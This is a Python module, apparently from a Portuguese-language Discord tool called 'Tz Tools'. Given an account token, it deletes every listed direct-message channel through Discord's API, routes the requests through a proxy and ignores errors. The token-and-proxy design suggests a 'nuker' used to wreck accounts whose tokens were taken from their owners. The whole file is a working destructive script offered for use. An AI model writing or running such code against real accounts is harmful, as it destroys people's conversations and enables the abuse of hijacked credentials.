# Esse self foi orgulhosamente codificado por Tz (https://instagram.com/tzfofo).
# Copyright (c) 2021 🜲 Oi, eu sou o Tz#0001 | https://instagram.com/tzfofo
# Tz Tools sob a Licença Pública Geral GNU v2 (1991).

import requests
from colorama import Fore

from util.plugins.common import getheaders, proxy

def DmDeleter(token, channels):
    for channel in channels:
        try:
            requests.delete(f'https://discord.com/api/v7/channels/'+channel['id'],
            proxies={"http": f'{proxy()}'},
            headers=getheaders(token))
            print(f"{Fore.RED}Mensagem direta excluída: {Fore.WHITE}"+channel['id']+Fore.RESET)
        except Exception as e:
            print(f"O seguinte erro foi encontrado e está sendo ignorado: {e}")